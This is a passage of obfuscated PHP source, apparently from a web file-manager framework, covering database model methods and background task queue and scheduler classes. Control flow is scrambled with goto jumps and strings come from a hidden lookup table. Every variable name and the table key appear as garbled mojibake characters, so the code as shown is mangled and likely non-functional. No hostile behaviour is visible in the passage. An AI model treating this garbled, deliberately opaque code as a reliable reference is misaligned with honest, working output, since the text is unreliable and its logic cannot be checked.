$aœ˘π»â’•[341]), $DËñòëˆ›Ω); $f‚∏ö™éŸÀ = vsprintf($f‚∏ö™éŸÀ, $DËñòëˆ›Ω); } else { $f‚∏ö™éŸÀ = strtr($f‚∏ö™éŸÀ, array($aœ˘π»â’•[342] => $this->getTableName(), $aœ˘π»â’•[343] => think_config($aœ˘π»â’•[242]))); } $this->db->setModel($this->name); return $f‚∏ö™éŸÀ; } public function db($D∫óÉˆ»ﬂ« = '', $bñéìúÚâä = '', $E±åÆáêπ¬ = array()) { goto E¿ÿûÓ¿ï∆; BâæœµçÌÇ: $DïÔÿΩíÂ‰[$D∫óÉˆ»ﬂ«] = $bñéìúÚâä; $this->db = $F”¬îÂ§‚[$D∫óÉˆ»ﬂ«]; $this->_after_db(); goto BùôΩ“î„ã; E¿ÿûÓ¿ï∆: $Eäåˆìòûˆ =& $_SERVER[’ÿƒ†ïò]; if ($Eäåˆìòûˆ[33] === $D∫óÉˆ»ﬂ« && $this->db) { return $this->db; } static $DïÔÿΩíÂ‰ = array(); goto Fâ¯ŸìŒÇê; Fâ¯ŸìŒÇê: static $F”¬îÂ§‚ = array(); if (!isset($F”¬îÂ§‚[$D∫óÉˆ»ﬂ«]) || isset($F”¬îÂ§‚[$D∫óÉˆ»ﬂ«]) && $bñéìúÚâä && $DïÔÿΩíÂ‰[$D∫óÉˆ»ﬂ«] != $bñéìúÚâä) { if (!empty($bñéìúÚâä) && is_string($bñéìúÚâä) && !1 === strpos($bñéìúÚâä, $Eäåˆìòûˆ[8])) { $bñéìúÚâä = think_config($bñéìúÚâä); } $F”¬îÂ§‚[$D∫óÉˆ»ﬂ«] = Db::getInstance($bñéìúÚâä); } elseif (NULL === $bñéìúÚâä) { $F”¬îÂ§‚[$D∫óÉˆ»ﬂ«]->close(); unset($F”¬îÂ§‚[$D∫óÉˆ»ﬂ«]); return; } if (!empty($E±åÆáêπ¬)) { if (is_string($E±åÆáêπ¬)) { parse_str($E±åÆáêπ¬, $E±åÆáêπ¬); } foreach ($E±åÆáêπ¬ as $Bÿç◊ÚÖﬂ© => $c⁄„È≤‘ïÎ) { $this->setProperty($Bÿç◊ÚÖﬂ©, $c⁄„È≤‘ïÎ); } } goto BâæœµçÌÇ; BùôΩ“î„ã: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto aÉƒ¡ª±Íá; aÉƒ¡ª±Íá: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $aóªÓä⁄¡ï = get_class($this); if ($aóªÓä⁄¡ï == $_SERVER[’ÿƒ†ïò][344]) { return $this->name; } $this->name = substr($aóªÓä⁄¡ï, 0, -5); } return $this->name; } public function getTableName() { $dìÃ‘ò˘ùƒ =& $_SERVER[’ÿƒ†ïò]; if (empty($this->trueTableName)) { $A‡∏ß∆Ó‹¨ = !empty($this->tablePrefix) ? $this->tablePrefix : $dìÃ‘ò˘ùƒ[33]; if (!empty($this->tableName)) { $A‡∏ß∆Ó‹¨ .= $this->tableName; } else { $A‡∏ß∆Ó‹¨ .= think_parse_name($this->name); } $this->trueTableName = strtolower($A‡∏ß∆Ó‹¨); } return (!empty($this->dbName) ? $this->dbName . $dìÃ‘ò˘ùƒ[95] : $dìÃ‘ò˘ùƒ[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $bà∑èáñÖÇ =& $_SERVER[’ÿƒ†ïò]; return isset($this->fields[$bà∑èáñÖÇ[249]]) ? $this->fields[$bà∑èáñÖÇ[249]] : $this->pk; } public function getDbFields() { $B—ˆäÃÊêÎ =& $_SERVER[’ÿƒ†ïò]; if (isset($this->options[$B—ˆäÃÊêÎ[277]])) { $E¢úáÀÀË¥ = $this->db->getFields($this->options[$B—ˆäÃÊêÎ[277]]); return $E¢úáÀÀË¥ ? array_keys($E¢úáÀÀË¥) : !1; } if ($this->fields) { $E¢úáÀÀË¥ = $this->fields; unset($E¢úáÀÀË¥[$B—ˆäÃÊêÎ[248]], $E¢úáÀÀË¥[$B—ˆäÃÊêÎ[249]], $E¢úáÀÀË¥[$B—ˆäÃÊêÎ[250]], $E¢úáÀÀË¥[$B—ˆäÃÊêÎ[247]]); return $E¢úáÀÀË¥; } return !1; } public function data($dÓà¨ÿ€ÜÒ = '') { $c±˜Ç›⁄Üà =& $_SERVER[’ÿƒ†ïò]; if ($c±˜Ç›⁄Üà[33] === $dÓà¨ÿ€ÜÒ && !empty($this->data)) { return $this->data; } if (is_object($dÓà¨ÿ€ÜÒ)) { $dÓà¨ÿ€ÜÒ = get_object_vars($dÓà¨ÿ€ÜÒ); } elseif (is_string($dÓà¨ÿ€ÜÒ)) { parse_str($dÓà¨ÿ€ÜÒ, $dÓà¨ÿ€ÜÒ); } elseif (!is_array($dÓà¨ÿ€ÜÒ)) { think_exception(think_lang($c±˜Ç›⁄Üà[269])); } $this->data = $dÓà¨ÿ€ÜÒ; return $this; } public function join($b∆œ¥Î±»Ω) { $dúú˘Ω¢éà =& $_SERVER[’ÿƒ†ïò]; if (is_array($b∆œ¥Î±»Ω)) { $this->options[$dúú˘Ω¢éà[280]] = $b∆œ¥Î±»Ω; } elseif (!empty($b∆œ¥Î±»Ω)) { $this->options[$dúú˘Ω¢éà[280]][] = $b∆œ¥Î±»Ω; } return $this; } public function union($AáÔî√üáë, $añ¨ıç∆Ÿ„ = false) { goto aåÀ›¡≤π; aåÀ›¡≤π: $AÇø‰Ì≤å≤ =& $_SERVER[’ÿƒ†ïò]; if (empty($AáÔî√üáë)) { return $this; } if ($añ¨ıç∆Ÿ„) { $this->options[$AÇø‰Ì≤å≤[345]][$AÇø‰Ì≤å≤[346]] = !0; } goto eû¶√—˜äç; A °ÆÉ∑üÊ: return $this; goto a‡›‹Ïâäé; eû¶√—˜äç: if (is_object($AáÔî√üáë)) { $AáÔî√üáë = get_object_vars($AáÔî√üáë); } if (is_string($AáÔî√üáë)) { $a≤ä›—ã„ˆ = $AáÔî√üáë; } elseif (is_array($AáÔî√üáë)) { if (isset($AáÔî√üáë[0])) { $this->options[$AÇø‰Ì≤å≤[345]] = array_merge($this->options[$AÇø‰Ì≤å≤[345]], $AáÔî√üáë); return $this; } else { $a≤ä›—ã„ˆ = $AáÔî√üáë; } } else { think_exception(think_lang($AÇø‰Ì≤å≤[269])); } $this->options[$AÇø‰Ì≤å≤[345]][] = $a≤ä›—ã„ˆ; goto A °ÆÉ∑üÊ; a‡›‹Ïâäé: } public function cache($fÏ¡¿”‡≥≤ = true, $b™ÑƒÏé«Ë = null, $A’Ò⁄∞Ωà˜ = '') { $Eû¿é˘´‘è =& $_SERVER[’ÿƒ†ïò]; if (!1 !== $fÏ¡¿”‡≥≤) { $this->options[$Eû¿é˘´‘è[347]] = array($Eû¿é˘´‘è[93] => $fÏ¡¿”‡≥≤, $Eû¿é˘´‘è[337] => $b™ÑƒÏé«Ë, $Eû¿é˘´‘è[29] => $A’Ò⁄∞Ωà˜); } return $this; } public function field($aç÷∆§ È‰, $A≤·••çÕ≤ = false) { $DÚ∑õèÙœÇ =& $_SERVER[’ÿƒ†ïò]; if (!0 === $aç÷∆§ È‰) { $aöê›—åÓ◊ = $this->getDbFields(); $aç÷∆§ È‰ = $aöê›—åÓ◊ ? $aöê›—åÓ◊ : $DÚ∑õèÙœÇ[182]; } elseif ($A≤·••çÕ≤) { if (is_string($aç÷∆§ È‰)) { $aç÷∆§ È‰ = explode($DÚ∑õèÙœÇ[47], $aç÷∆§ È‰); } $aöê›—åÓ◊ = $this->getDbFields(); $aç÷∆§ È‰ = $aöê›—åÓ◊ ? array_diff($aöê›—åÓ◊, $aç÷∆§ È‰) : $aç÷∆§ È‰; } $this->options[$DÚ∑õèÙœÇ[271]] = $aç÷∆§ È‰; return $this; } public function scope($eå™äë≤ﬁŒ = '', $Eñ∆´Ç∂•ö = NULL) { $c¬⁄’º–á⁄ =& $_SERVER[’ÿƒ†ïò]; if ($c¬⁄’º–á⁄[33] === $eå™äë≤ﬁŒ) { if (isset($this->_scope[$c¬⁄’º–á⁄[34]])) { $a°œ√–ÍÊ” = $this->_scope[$c¬⁄’º–á⁄[34]]; } else { return $this; } } elseif (is_string($eå™äë≤ﬁŒ)) { $EâÁáòèÀÑ = explode($c¬⁄’º–á⁄[47], $eå™äë≤ﬁŒ); $a°œ√–ÍÊ” = array(); foreach ($EâÁáòèÀÑ as $b¡©´Ü±ı) { if (!isset($this->_scope[$b¡©´Ü±ı])) { continue; } $a°œ√–ÍÊ” = array_merge($a°œ√–ÍÊ”, $this->_scope[$b¡©´Ü±ı]); } if (!empty($Eñ∆´Ç∂•ö) && is_array($Eñ∆´Ç∂•ö)) { $a°œ√–ÍÊ” = array_merge($a°œ√–ÍÊ”, $Eñ∆´Ç∂•ö); } } elseif (is_array($eå™äë≤ﬁŒ)) { $a°œ√–ÍÊ” = $eå™äë≤ﬁŒ; } if (is_array($a°œ√–ÍÊ”) && !empty($a°œ√–ÍÊ”)) { $this->options = array_merge($this->options, array_change_key_case($a°œ√–ÍÊ”)); } return $this; } public function where($AçÔ≠¯´»ö, $e©∞‰ìî”Û = null) { $E∫Éÿ–Â…Ì =& $_SERVER[’ÿƒ†ïò]; if (!is_null($e©∞‰ìî”Û) && is_string($AçÔ≠¯´»ö)) { if (!is_array($e©∞‰ìî”Û)) { $e©∞‰ìî”Û = func_get_args(); array_shift($e©∞‰ìî”Û); } $e©∞‰ìî”Û = array_map(array($this->db, $E∫Éÿ–Â…Ì[341]), $e©∞‰ìî”Û); $AçÔ≠¯´»ö = vsprintf($AçÔ≠¯´»ö, $e©∞‰ìî”Û); } elseif (is_object($AçÔ≠¯´»ö)) { $AçÔ≠¯´»ö = get_object_vars($AçÔ≠¯´»ö); } elseif (is_array($AçÔ≠¯´»ö)) { foreach ($AçÔ≠¯´»ö as $BÂ«œ∆±á◊ => $Dæ◊Ç÷úƒ◊) { if ((is_numeric($BÂ«œ∆±á◊) || !$BÂ«œ∆±á◊) && is_string($Dæ◊Ç÷úƒ◊)) { if (strpos($Dæ◊Ç÷úƒ◊, $E∫Éÿ–Â…Ì[348]) === 0) { continue; } think_trace($E∫Éÿ–Â…Ì[349], $E∫Éÿ–Â…Ì[33], $E∫Éÿ–Â…Ì[46]); die; } } } if (is_string($AçÔ≠¯´»ö) && $E∫Éÿ–Â…Ì[33] != $AçÔ≠¯´»ö) { $aø‰Ó¿ã¬» = array(); $aø‰Ó¿ã¬»[$E∫Éÿ–Â…Ì[350]] = $AçÔ≠¯´»ö; $AçÔ≠¯´»ö = $aø‰Ó¿ã¬»; } if (isset($this->options[$E∫Éÿ–Â…Ì[273]])) { $this->options[$E∫Éÿ–Â…Ì[273]] = array_merge($this->options[$E∫Éÿ–Â…Ì[273]], $AçÔ≠¯´»ö); } else { $this->options[$E∫Éÿ–Â…Ì[273]] = $AçÔ≠¯´»ö; } return $this; } public function limit($FòÇÕ’íä€, $BçúÉîÙ¯é = null) { $AáµÙèéﬁÔ =& $_SERVER[’ÿƒ†ïò]; $this->options[$AáµÙèéﬁÔ[290]] = is_null($BçúÉîÙ¯é) ? $FòÇÕ’íä€ : $FòÇÕ’íä€ . $AáµÙèéﬁÔ[47] . $BçúÉîÙ¯é; return $this; } public function page($bø©§íœ◊ñ, $F«Á›Ôœ‹¶ = null) { $Eı¥ë∞⁄ÁÏ =& $_SERVER[’ÿƒ†ïò]; $this->options[$Eı¥ë∞⁄ÁÏ[351]] = is_null($F«Á›Ôœ‹¶) ? $bø©§íœ◊ñ : $bø©§íœ◊ñ . $Eı¥ë∞⁄ÁÏ[47] . $F«Á›Ôœ‹¶; return $this; } public function comment($C÷ˆÇ∑ÍîË) { $this->options[$_SERVER[’ÿƒ†ïò][352]] = $C÷ˆÇ∑ÍîË; return $this; } public function setProperty($AíÎËñƒ®–, $F—ÓÕè÷æ≠) { if (property_exists($this, $AíÎËñƒ®–)) { $this->{$AíÎËñƒ®–} = $F—ÓÕè÷æ≠; } return $this; } } goto Añü¢ﬁÎÒÀ; DıÖÖŒÌµ«: class TaskHttp extends Task { protected function startAfter() { $aÌ—Íçûœó =& $_SERVER[’ÿƒ†ïò]; $b›°¡∂ﬁä =& $this->task; $b›°¡∂ﬁä[$aÌ—Íçûœó[1626]] = 1; Hook::bind($aÌ—Íçûœó[1595], array($this, $aÌ—Íçûœó[1627])); Hook::bind($aÌ—Íçûœó[1597], array($this, $aÌ—Íçûœó[1628])); Hook::bind($aÌ—Íçûœó[1599], array($this, $aÌ—Íçûœó[1629])); } protected function endAfter() { $F≥ø√ÚØΩ =& $_SERVER[’ÿƒ†ïò]; Hook::unbind($F≥ø√ÚØΩ[1595], array($this, $F≥ø√ÚØΩ[1627])); Hook::unbind($F≥ø√ÚØΩ[1597], array($this, $F≥ø√ÚØΩ[1628])); Hook::unbind($F≥ø√ÚØΩ[1599], array($this, $F≥ø√ÚØΩ[1629])); } public function progressStart($E¿Û™Áû‡Ç) { $B’ö∑Ü‹ Œ =& $_SERVER[’ÿƒ†ïò]; $b¬Ù∑•¬”≥ = curl_getinfo($E¿Û™Áû‡Ç); self::log($B’ö∑Ü‹ Œ[1630] . $b¬Ù∑•¬”≥[$B’ö∑Ü‹ Œ[305]]); self::valueSet($this->task[$B’ö∑Ü‹ Œ[395]], $this->task); } public function progressEnd($Dâ¢µ≠≈èà) { $dã æåéûé =& $_SERVER[’ÿƒ†ïò]; self::log($dã æåéûé[1631] . $this->task[$dã æåéûé[395]]); $this->end(); } public function progress($fäÉ¢¬ò≤È, $b÷àÈ÷¶”≤, $B√÷Ø”¿ÃÁ, $aâª≠àØ¶µ, $dÈÑﬂÖ‚Ô¥) { $C∏ÏÌì¢ı¯ =& $_SERVER[’ÿƒ†ïò]; $EÑ≤ø™•µı =& $this->task; if ($dÈÑﬂÖ‚Ô¥ > 0) { $EÑ≤ø™•µı[$C∏ÏÌì¢ı¯[1050]] = $EÑ≤ø™•µı[$C∏ÏÌì¢ı¯[1050]] == 0 ? $aâª≠àØ¶µ : $EÑ≤ø™•µı[$C∏ÏÌì¢ı¯[1050]]; $EÑ≤ø™•µı[$C∏ÏÌì¢ı¯[1064]] = $dÈÑﬂÖ‚Ô¥; } else { if ($B√÷Ø”¿ÃÁ > 0) { $EÑ≤ø™•µı[$C∏ÏÌì¢ı¯[1050]] = $EÑ≤ø™•µı[$C∏ÏÌì¢ı¯[1050]] == 0 ? $b÷àÈ÷¶”≤ : $EÑ≤ø™•µı[$C∏ÏÌì¢ı¯[1050]]; $EÑ≤ø™•µı[$C∏ÏÌì¢ı¯[1064]] = $B√÷Ø”¿ÃÁ; } } $this->update(); self::log("\160\x72\x6f\147\x72\x65\163\163\110\164\x74\160\72\x64\x6f\x77\156\x3a{$B√÷Ø”¿ÃÁ}\x2f{$b÷àÈ÷¶”≤}\73\x20\165\x70\x6c\157\x61\144\x3a{$dÈÑﬂÖ‚Ô¥}\x2f{$aâª≠àØ¶µ}\73"); } } class TaskQueue { const MAX_LENGTH = 1000; const QUEUE_LENGTH = "\164\141\163\x6b\121\165\145\x75\x65\114\145\156\147\x74\150"; const QUEUE_DATA = "\x74\141\163\153\x51\165\145\165\x65\x44\141\164\141"; public static $listData = false; public static function initTask() { } public static function add($E·óÚ®îÔ¢, $D®©øéåà¬ = array(), $dÁˆ÷±È™· = '', $cùÇé∆Òª€ = '') { $f´óËÀ«éà =& $_SERVER[’ÿƒ†ïò]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($cùÇé∆Òª€ && array_find_by_field(self::$listData, $f´óËÀ«éà[93], $cùÇé∆Òª€)) { return !0; } self::$listData[] = array($f´óËÀ«éà[262] => $E·óÚ®îÔ¢, $f´óËÀ«éà[1632] => $D®©øéåà¬, $f´óËÀ«éà[445] => $dÁˆ÷±È™·, $f´óËÀ«éà[93] => $cùÇé∆Òª€); return !0; } public static function addSubmit() { $F⁄Ó¢ãÛû¿ =& $_SERVER[’ÿƒ†ïò]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($F⁄Ó¢ãÛû¿[1633] . json_encode_force(array_to_keyvalue(self::$listData, $F⁄Ó¢ãÛû¿[33], $F⁄Ó¢ãÛû¿[445])), $F⁄Ó¢ãÛû¿[1634]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($AΩ§˘ç˜‹÷, $Fπä≈«™µû = array(), $d–ﬂ»∫ØÎ≠ = '', $BÁ∆ÉçÍÔê = '') { goto cÚı˜∫’ù¡; E°›•„ëêÆ: self::setAll($fë∏Œ¿Ãî‘); return !0; goto b†ö≈ë÷†”; Bÿ‚à€«àü: if ($BÁ∆ÉçÍÔê && array_find_by_field($fë∏Œ¿Ãî‘, $F∆êáÎÜ‹§[93], $BÁ∆ÉçÍÔê)) { return !0; } $fë∏Œ¿Ãî‘[] = array($F∆êáÎÜ‹§[262] => $AΩ§˘ç˜‹÷, $F∆êáÎÜ‹§[1632] => $Fπä≈«™µû, $F∆êáÎÜ‹§[445] => $d–ﬂ»∫ØÎ≠, $F∆êáÎÜ‹§[93] => $BÁ∆ÉçÍÔê); write_log($F∆êáÎÜ‹§[1633] . $d–ﬂ»∫ØÎ≠, $F∆êáÎÜ‹§[1634]); goto E°›•„ëêÆ; cÚı˜∫’ù¡: $F∆êáÎÜ‹§ =& $_SERVER[’ÿƒ†ïò]; if (self::count() >= self::MAX_LENGTH) { return !1; } $fë∏Œ¿Ãî‘ = self::getAll(); goto Bÿ‚à€«àü; b†ö≈ë÷†”: } public static function run() { goto FÈ≥ã‰ô”À; C∏¡≈Û∆ë”: try { Hook::apply($cƒÿ˘®ÇÑ∂[$E‡¢∞ﬂÓÛæ[262]], $cƒÿ˘®ÇÑ∂[$E‡¢∞ﬂÓÛæ[1632]]); } catch (Exception $däá“êø¨„) { } $eı°È‹Æ◊¥ = number_format(timeFloat() - $a®ÒÌ„©‡È, 3) . $E‡¢∞ﬂÓÛæ[1570]; write_log($E‡¢∞ﬂÓÛæ[1635] . $cƒÿ˘®ÇÑ∂[$E‡¢∞ﬂÓÛæ[445]] . $E‡¢∞ﬂÓÛæ[1636] . $eı°È‹Æ◊¥, $E‡¢∞ﬂÓÛæ[1634]); goto cêç°õÑÂ∫; B±Îéµé≤Ç: if (!$cƒÿ˘®ÇÑ∂) { return !1; } self::setAll($D¡ˆÜ‹‰ãÚ); $a®ÒÌ„©‡È = timeFloat(); goto C∏¡≈Û∆ë”; cêç°õÑÂ∫: return !0; goto c±‡˜„´ÿÚ; FÈ≥ã‰ô”À: $E‡¢∞ﬂÓÛæ =& $_SERVER[’ÿƒ†ïò]; $D¡ˆÜ‹‰ãÚ = self::getAll(); $cƒÿ˘®ÇÑ∂ = array_shift($D¡ˆÜ‹‰ãÚ); goto B±Îéµé≤Ç; c±‡˜„´ÿÚ: } public static function count() { $Dî√åÇèÒá = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$Dî√åÇèÒá) { return 0; } return intval($Dî√åÇèÒá); } public static function getAll() { $aÔ ˜êŸÇ∂ = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$aÔ ˜êŸÇ∂) { return array(); } return $aÔ ˜êŸÇ∂; } public static function setAll($CÍ…ÈûÏ¬≠) { $bÈÇæÖœíÔ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($CÍ…ÈûÏ¬≠), $bÈÇæÖœíÔ); Cache::set(self::QUEUE_DATA, $CÍ…ÈûÏ¬≠, $bÈÇæÖœíÔ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($BáµãÀ∆õΩ, $Cë‹ú∑ç∂È = 5.0) { if (!$BáµãÀ∆õΩ) { return; } $cï≠ËÍüóÑ = Cache::get($BáµãÀ∆õΩ); if (!$cï≠ËÍüóÑ || timeFloat() - floatVal($cï≠ËÍüóÑ) >= $Cë‹ú∑ç∂È) { Cache::set($BáµãÀ∆õΩ, timeFloat(), $Cë‹ú∑ç∂È * 10); return !0; } return !1; } public static function timeLimitCall($aÍ≥≤•»ïã, $C—åÜáùèê, $eå≠éúÎÌÍ, $E£Ωä©‰Éﬂ = 5.0) { goto c◊†÷ﬂÁÇ; DÜ⁄Ìﬂå‰Ÿ: $FÉπê◊°ü≠ = $Fö∏Ç¬ìÚî[1637]; $Fﬁ£í—æŸ = Cache::get($FÉπê◊°ü≠, !0); $C—≥¬ù…”» = array($Fö∏Ç¬ìÚî[1638] => timeFloat(), $Fö∏Ç¬ìÚî[1639] => timeFloat(), $Fö∏Ç¬ìÚî[262] => $C—åÜáùèê, $Fö∏Ç¬ìÚî[1632] => $eå≠éúÎÌÍ, $Fö∏Ç¬ìÚî[197] => $E£Ωä©‰Éﬂ); goto F≥“Ñè¯çâ; c§Ù®îÓ≤Ω: Cache::set($FÉπê◊°ü≠, $Fﬁ£í—æŸ, 60); Cache::removeMemory($FÉπê◊°ü≠); write_log($Fö∏Ç¬ìÚî[1640] . $aÍ≥≤•»ïã . $Fö∏Ç¬ìÚî[68] . $C—åÜáùèê, $Fö∏Ç¬ìÚî[1634]); goto B≠ËéßÇÃ; c◊†÷ﬂÁÇ: $Fö∏Ç¬ìÚî =& $_SERVER[’ÿƒ†ïò]; if (!$aÍ≥≤•»ïã || !$C—åÜáùèê) { return; } self::$asyncAdd = !0; goto DÜ⁄Ìﬂå‰Ÿ; F≥“Ñè¯çâ: if (is_array($Fﬁ£í—æŸ[$aÍ≥≤•»ïã])) { $C—≥¬ù…”»[$Fö∏Ç¬ìÚî[1639]] = $Fﬁ£í—æŸ[$aÍ≥≤•»ïã][$Fö∏Ç¬ìÚî[1639]]; } if (is_array($Fﬁ£í—æŸ[$aÍ≥≤•»ïã])) { if (timeFloat() - $Fﬁ£í—æŸ[$aÍ≥≤•»ïã][$Fö∏Ç¬ìÚî[1638]] < $C—≥¬ù…”»[$Fö∏Ç¬ìÚî[197]] * 0.3) { return; } $C—≥¬ù…”»[$Fö∏Ç¬ìÚî[1639]] = $Fﬁ£í—æŸ[$aÍ≥≤•»ïã][$Fö∏Ç¬ìÚî[1639]]; } $Fﬁ£í—æŸ[$aÍ≥≤•»ïã] = $C—≥¬ù…”»; goto c§Ù®îÓ≤Ω; B≠ËéßÇÃ: } public static function timeLimitCallLoop() { goto d†ù¥ØÿäÕ; B…å≤¯Î∫ë: if (!$BÕÂ¥ìå—â && !self::$asyncAdd) { return; } $cı›Óºˆ–Ü = $DŸ‘◊‰ÿáê[1637]; $e∏™’Ú¶Òò = Cache::get($cı›Óºˆ–Ü, !0); goto eÈıäÖÓÑå; b∂©∏Ã©ö¡: $fË∫é≥˘†— = array(); foreach ($e∏™’Ú¶Òò as $A£ã≥ì˜‰“ => $bö©…“∆¬) { if ($eŸ∏¡§ÕÃ√ - $bö©…“∆¬[$DŸ‘◊‰ÿáê[1639]] > $bö©…“∆¬[$DŸ‘◊‰ÿáê[197]]) { $D«Îœùæ—Í = !0; try { Hook::apply($bö©…“∆¬[$DŸ‘◊‰ÿáê[262]], $bö©…“∆¬[$DŸ‘◊‰ÿáê[1632]]); write_log($DŸ‘◊‰ÿáê[1642] . $A£ã≥ì˜‰“ . $DŸ‘◊‰ÿáê[68] . $bö©…“∆¬[$DŸ‘◊‰ÿáê[262]] . $DŸ‘◊‰ÿáê[1643] . ACTION, $DŸ‘◊‰ÿáê[1634]); } catch (Exception $B⁄«å™™Ωá) { } continue; } $fË∫é≥˘†—[$A£ã≥ì˜‰“] = $bö©…“∆¬; } if (!$D«Îœùæ—Í) { return; } goto fÑ€¯ûâ®Ç; fÑ€¯ûâ®Ç: if (!$fË∫é≥˘†—) { return Cache::remove($cı›Óºˆ–Ü); } Cache::set($cı›Óºˆ–Ü, $fË∫é≥˘†—, 60); Cache::removeMemory($cı›Óºˆ–Ü); goto cÔÇ”áﬂ‡∆; eÈıäÖÓÑå: if (!$e∏™’Ú¶Òò || count($e∏™’Ú¶Òò) <= 0) { return; } $D«Îœùæ—Í = !1; $eŸ∏¡§ÕÃ√ = timeFloat(); goto b∂©∏Ã©ö¡; d†ù¥ØÿäÕ: $DŸ‘◊‰ÿáê =& $_SERVER[’ÿƒ†ïò]; $EıÚéµÊ∏ÿ = array($DŸ‘◊‰ÿáê[1641]); $BÕÂ¥ìå—â = in_array(strtolower(ACTION), $EıÚéµÊ∏ÿ); goto B…å≤¯Î∫ë; cÔÇ”áﬂ‡∆: } public static function finished($e°ø∏ô èæ, $d¨ÌÀªº…É) { $AÔÇÏú©ªä =& $_SERVER[’ÿƒ†ïò]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($AÔÇÏú©ªä[262] => $e°ø∏ô èæ, $AÔÇÏú©ªä[1632] => $d¨ÌÀªº…É); } private static function finishedRun() { $aêµë®¡›ä =& $_SERVER[’ÿƒ†ïò]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $c∆∞∆≤®ñâ) { try { Hook::apply($c∆∞∆≤®ñâ[$aêµë®¡›ä[262]], $c∆∞∆≤®ñâ[$aêµë®¡›ä[1632]]); } catch (Exception $e…€¶ßœÖ≤) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } goto Aë≈˘ÍÛêΩ; AÈ§ƒ°‹é»: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { goto eëª’ÏâÁ¬; BõöÉ”Á—ª: http_close(); self::valueSet($EÚä·≠Öƒµ[1520], $EÚä·≠Öƒµ[87]); Hook::bind($EÚä·≠Öƒµ[1522], $EÚä·≠Öƒµ[1523]); goto B¨°◊áà‚æ; eëª’ÏâÁ¬: $EÚä·≠Öƒµ =& $_SERVER[’ÿƒ†ïò]; if (self::valueGet($EÚä·≠Öƒµ[738]) != $EÚä·≠Öƒµ[87]) { return; } if (self::valueGet($EÚä·≠Öƒµ[1520]) == $EÚä·≠Öƒµ[87]) { $dºçÆ∆ÖÛı = self::valueGet($EÚä·≠Öƒµ[1521]); if (time() - $dºçÆ∆ÖÛı > self::AUTO_RESTART_TIME) { self::restart(); } return; } goto BõöÉ”Á—ª; B¨°◊áà‚æ: while (!0) { self::cacheClear(); if (self::valueGet($EÚä·≠Öƒµ[738]) != $EÚä·≠Öƒµ[87]) { self::valueSet($EÚä·≠Öƒµ[1520], $EÚä·≠Öƒµ[191]); self::log($EÚä·≠Öƒµ[1524]); die; } self::valueSet($EÚä·≠Öƒµ[1520], $EÚä·≠Öƒµ[87]); self::valueSet($EÚä·≠Öƒµ[1521], time()); self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } goto Bˆßµ–ﬂº≈; Bˆßµ–ﬂº≈: } public static function restart() { $eôáîå∂Ç‡ =& $_SERVER[’ÿƒ†ïò]; http_close(); self::valueSet($eôáîå∂Ç‡[738], $eôáîå∂Ç‡[191]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet($eôáîå∂Ç‡[1520], $eôáîå∂Ç‡[191]); self::valueSet($eôáîå∂Ç‡[738], $eôáîå∂Ç‡[87]); } public static function shutdownEvent() { $D≈¬ê√ê∆° =& $_SERVER[’ÿƒ†ïò]; self::valueSet($D≈¬ê√ê∆°[1520], $D≈¬ê√ê∆°[191]); self::log($D≈¬ê√ê∆°[1525]); } public static function config($b·”¨Ü Ω¥, $E’ª§§ÈÛÜ) { self::valueSet($_SERVER[’ÿƒ†ïò][738], $b·”¨Ü Ω¥); } private static function taskRunAll() { goto c±É¥ŸÓÊ¥; eÏ˘∑»È∆ò: self::taskQueueRun($fò”õËÑµ„); goto Aé≥„Àı ±; E€êßØËÚà: $BÌíÔìÉÑç = count($Bä∞∞◊ﬁ«…); for ($bµ≠ß‘Ë‘Ò = 0; $bµ≠ß‘Ë‘Ò < $BÌíÔìÉÑç; $bµ≠ß‘Ë‘Ò++) { $e…Ú”ìéÌö = $Bä∞∞◊ﬁ«…[$bµ≠ß‘Ë‘Ò]; if (!$e…Ú”ìéÌö[$d·¯«éÙΩ™[395]] || $e…Ú”ìéÌö[$d·¯«éÙΩ™[1527]] != $d·¯«éÙΩ™[87]) { continue; } if (!self::taskTimeCheck($e…Ú”ìéÌö)) { continue; } self::taskRun($e…Ú”ìéÌö); } Hook::trigger($d·¯«éÙΩ™[1528]); goto eÏ˘∑»È∆ò; c±É¥ŸÓÊ¥: $d·¯«éÙΩ™ =& $_SERVER[’ÿƒ†ïò]; $fò”õËÑµ„ = timeFloat(); $Bä∞∞◊ﬁ«… = Model($d·¯«éÙΩ™[1526])->listData(); goto E€êßØËÚà; Aé≥„Àı ±: } private static function taskQueueRun($c®¡ÜÏÌë≤) { $dãœ’í€ÕŸ = 10; while (!0) { $Eó‘ô“öîà = TaskQueue::run(); if ($Eó‘ô“öîà === !1) { break; } if (timeFloat() - $c®¡ÜÏÌë≤ >= $dãœ’í€ÕŸ) { break; } } } private static function taskTimeCheck($BøÑ·∂åœ±) { goto f≈Û∞È«§ı; D¬„ú˜é™: switch ($c÷ Øâºêå[$Dä¥Ãá„œÉ[29]]) { case $Dä¥Ãá„œÉ[1535]: if (time() - $E®ÖîÙ«ä´ < 3600 * 24 * 30) { return !1; } if ($c÷ Øâºêå[$Dä¥Ãá„œÉ[1535]] == date($Dä¥Ãá„œÉ[1536]) && $eÑﬁÈ≤≈ÿ) { return !0; } break; case 